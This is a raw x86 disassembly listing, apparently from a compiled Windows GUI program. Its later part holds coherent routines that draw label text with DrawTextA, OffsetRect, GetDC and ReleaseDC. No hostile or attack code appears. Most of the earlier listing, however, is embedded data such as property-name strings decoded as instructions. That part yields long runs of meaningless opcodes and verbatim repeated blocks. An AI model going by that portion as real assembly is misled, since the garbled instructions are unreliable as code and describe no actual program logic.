add [ eax ] al
add [ eax ] al
nop
add eax [ eax + eax + 0x18 ]
je r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] bh
xor [ eax + eax + 0x5c ] eax
rol [ eax + eax + 0x50 ] 0x5
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax - 0x48 ]
fiadd [ eax + eax + 0x30 ]
pop es
inc ebp
add [ eax ] al
in eax 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ ebx + esi + 0x44 ] cl
add [ ebx + esi + 0x44 ] ch
add al bh
xor al [ eax + eax + 0x6 ]
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
pop esp
xor al 0x44
add [ eax + 0x34 ] dh
inc esp
add [ eax + 0x34 ] bh
inc esp
add [ esi + 0x33380044 ] dl
inc esp
add ah cl
xor al [ eax + eax + 0xf ]
push esp
inc ebx
jne r-xdata
inc esp
add ah dl
xor eax [ eax + eax - 0x5c ]
fadd [ eax + eax + 0x30 ]
xor al 0x44
shr [ eax ] 0x2
inc esp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
xor eax [ eax ]
xchg esp eax
loop r-xdata
add [ eax - 0x67ffbdf0 ] dl
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
add [ eax + eax + 0x54 ] eax
add [ eax + eax + 0xc ] al
add [ eax ] cl
push ebx
je r-xdata
jae r-xdata
add al [ eax ]
add ah cl
add [ eax + eax + 0x3c ] al
pop ss
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
add al [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4403 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004403 ] dl
adc [ ebp ] eax
add [ edx + 0x30ec0044 ] dl
inc eax
add [ eax ] cl
xor [ eax ] eax
insb
lds eax [ eax + eax - 0x10 ]
inc ebx
je r-xdata
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x32 ] ah
inc esp
add [ ecx + 0x12200045 ] al
inc ebp
[ ebp ] eax
insb
jae r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x950ff00 ] ah
add [ eax ] al
adc [ eax ] al
sub_440345
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 + 0x33d40044 ] bh
inc esp
add [ eax + ebx * 8 + 0x34300044 ] ah
inc esp
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax - 0x48 ]
fiadd [ eax + eax + 0x30 ]
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] bh
xor [ eax + eax + 0x5c ] eax
rol [ eax + eax + 0x50 ] 0x5
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
shl [ eax + 0x7004403 ] 0x9
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
pop es
inc ebp
add [ eax ] al
in eax 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ ebx + esi + 0x44 ] cl
add [ ebx + esi + 0x44 ] ch
add al bh
xor al [ eax + eax + 0x9 ]
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
adc bl bl
inc esp
add [ eax + 0x300044da ] bh
add al [ eax + eax + 0x24 ]
add al [ eax + eax + 0x36 ]
add [ eax ] cl
push ebx
je r-xdata
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
inc ebx
je r-xdata
outsd
cld
jb r-xdata
add [ ecx ] ah
add bh bh
je r-xdata
insb
jae r-xdata
or [ ebp ] al
or [ eax ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
add dh bh
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
xor eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x3c00416e ] dh
add [ eax ] al
add [ gs : eax ] dl
xor eax [ esp + edx + 0x47 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
push esp
dec esi
inc esp
fcomp [ edi + 0x44 ]
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x6f6c6f43
dec ebp
inc esp
add [ eax ] ah
sahf
inc esp
add [ eax - 0x62 ] dl
inc esp
add [ esi + edi * 4 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
mov esp 0x5f004155
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
jb r-xdata
insb
outsd
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov [ edx ] ch
inc edx
add [ eax ] ch
inc ebx
jne r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
call [ edi + ebx * 4 ]
jae r-xdata
add bh bh
adc al 0x9f
jb r-xdata
outsd
outsb
jae r-xdata
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
sub_4403c8
xchg esp eax
xchg ecx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
xchg esp eax
push ebp
inc ecx
add [ eax ] dl
add al [ eax ]
[ eax + 0x33 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
outsd
cld
jb r-xdata
or [ ebp ] al
or [ eax ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
add [ gs : eax ] dl
xor eax [ esp + edx + 0x47 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
push esp
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
add dh bh
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov [ edx ] ch
inc edx
add [ eax ] ch
inc ebx
jne r-xdata
fcomp [ edi + 0x44 ]
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x6f6c6f43
dec ebp
inc esp
add [ eax ] ah
sahf
inc esp
add [ eax - 0x62 ] dl
inc esp
add [ esi + edi * 4 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
mov esp 0x5f004155
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
call [ edi + ebx * 4 ]
jae r-xdata
jb r-xdata
insb
outsd
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
add bh bh
adc al 0x9f
jb r-xdata
outsd
outsb
jae r-xdata
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
sub_440a99
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 + 0x37140044 ] bh
inc esp
add [ eax + ebx * 8 + 0x376c0044 ] ah
inc esp
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax - 0x48 ]
fiadd [ eax + eax + 0x30 ]
pop es
inc ebp
add [ eax ] al
in eax 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ ebp + esi + 0x36880044 ] al
inc esp
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x98ff
sub_440d1a
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
jmp esp
jo r-xdata
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
jb r-xdata
push eax
popad
push 0x6948776f
outsb
je r-xdata
inc esp
add [ eax ] bh
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push edi
jb r-xdata
inc eax
popfd
jo r-xdata
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
jb r-xdata
push cs
push eax
popad
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9430f1c
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
jb r-xdata
push edi
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
dec esp
lahf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] eax
jmp [ eax ]
push edi
inc ecx
add [ eax ] ah
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
dec esp
xor al [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
or [ ebp ] al
cmp [ ecx ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
add al 0x57
inc ecx
add al al
push edi
jo r-xdata
add [ eax - 0x1 ] al
and [ eax ] al
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov es [ ebp ]
jl r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
loopne r-xdata
jo r-xdata
push eax
inc esp
loopne r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
push edi
inc ecx
add al cl
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
add al ah
add [ eax ] eax
jmp eax
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
and edi esp
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x7dde8c6 ] cl
add [ eax ] eax
mov eax [ esi + 0x50 ]
push ebp
jo r-xdata
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
inc esp
outsd
ja r-xdata
outsb
push ebx
je r-xdata
dec edi
mov eax 0xe000444f
add [ eax ] al
jmp eax
xchg esp eax
push eax
inc esp
add al ch
add [ eax ] eax
inc esp
push eax
inc esp
add al bl
add [ eax ] eax
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
push esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
mov [ esi + 0x170 ] 0x1
call sub_43dfe8
call sub_43e0c8
add [ eax ] eax
add [ ecx ] al
jb r-xdata
add al bl
add [ eax ] al
xor [ eax + 0x44 ] dl
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_4495dc
inc esi
push eax
jb r-xdata
test al al
je r-xdata
inc esp
jb r-xdata
mov edx 0x11
mov eax esi
call sub_449600
mov [ esi + 0x16d ] 0x1
add [ eax ] al
inc esp
outsd
xchg [ eax + 0x1 ] dh
add [ eax ] al
add eax ebp
outsb
into
nop
sub_441128
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451920
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_4495dc
mov edx 0x11
mov eax esi
call sub_449600
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_4411d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44132a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c100
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_424ed8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404218
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ ebx + 0x160 ]
call sub_424fb8
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_424028
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ ebx + 0x160 ]
call sub_424fb8
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_424028
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ ebx + 0x160 ]
call sub_424fb8
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441331
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_44133b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_441564
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424910
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4247f4
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424910
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_424b98
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403350
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403350
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_44145c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_425038
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403350
xor edx edx
mov eax [ edi + 0x160 ]
call sub_425038
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403350
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_446c00
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_4415a0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_441564
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441600
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403350
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441628
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4492f0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_44168c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_441719
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441720
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449e20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460a78
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403350
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_441770
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c448
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
